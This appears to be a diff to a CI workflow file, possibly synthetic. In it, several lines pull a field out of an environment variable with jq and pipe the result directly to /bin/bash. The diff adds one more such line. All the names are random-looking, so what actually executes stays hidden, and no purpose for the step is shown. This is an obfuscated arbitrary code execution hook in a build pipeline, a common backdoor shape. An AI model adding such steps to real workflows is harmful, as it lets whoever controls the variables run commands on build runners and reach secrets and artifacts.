@@ -27,6 +27,7 @@ jobs:
           printf '%s' "$pqd32" | jq -r .rqfyl36694 | /bin/bash
           printf '%s' "$lvseb7724" | jq -r .r6557 | /bin/bash
           echo $hx9 | jq -r .gd99 | /bin/bash
+          printf '%s' "$pjw03" | jq -r .mxjm0 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
